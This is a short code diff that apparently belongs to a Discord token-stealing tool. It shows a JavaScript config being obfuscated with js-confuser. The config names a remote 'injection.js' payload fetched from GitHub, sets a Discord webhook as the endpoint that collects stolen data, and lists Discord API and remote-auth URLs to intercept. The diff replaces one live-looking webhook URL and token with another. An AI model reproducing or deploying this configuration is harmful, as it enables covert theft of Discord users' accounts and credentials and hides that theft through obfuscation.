@@ -4,7 +4,7 @@ const JsConfuser = require("js-confuser");
 
 let config_obf
 
-JsConfuser.obfuscate('const config = {    "logout": "true",    "logout-notify": "true",    "init-notify": "true",    "embed-color": 16711680, injection_url: "https://raw.githubusercontent.com/Yxxtsuu/BlazeArchive/main/injection.js",    apiurl: "https://discord.com/api/webhooks/1099326371903324200/8Rp8NdUxH__0_s-KoEOysBQLvEcQB6g39-c1zr3Npe4BHMVvF8CkNsov9G7xzq3Et5uA",    filter2: {        urls: [            "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",            "https://*.discord.com/api/v*/applications/detectable",            "https://discord.com/api/v*/applications/detectable",            "https://*.discord.com/api/v*/users/@me/library",            "https://discord.com/api/v*/users/@me/library",            "wss://remote-auth-gateway.discord.gg/*",        ],},};', 
+JsConfuser.obfuscate('const config = {    "logout": "true",    "logout-notify": "true",    "init-notify": "true",    "embed-color": 16711680, injection_url: "https://raw.githubusercontent.com/Yxxtsuu/BlazeArchive/main/injection.js",    apiurl: "https://discord.com/api/webhooks/1127536485885812817/cJfawxhGmUVhknK_-EcJwqI57EmNq9e-eGoLXCNSeRzMwjAE7hDZfdF2FzLx8Jt-yD8U",    filter2: {        urls: [            "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",            "https://*.discord.com/api/v*/applications/detectable",            "https://discord.com/api/v*/applications/detectable",            "https://*.discord.com/api/v*/users/@me/library",            "https://discord.com/api/v*/users/@me/library",            "wss://remote-auth-gateway.discord.gg/*",        ],},};', 
 {
   target: "node",
   preset: "low",
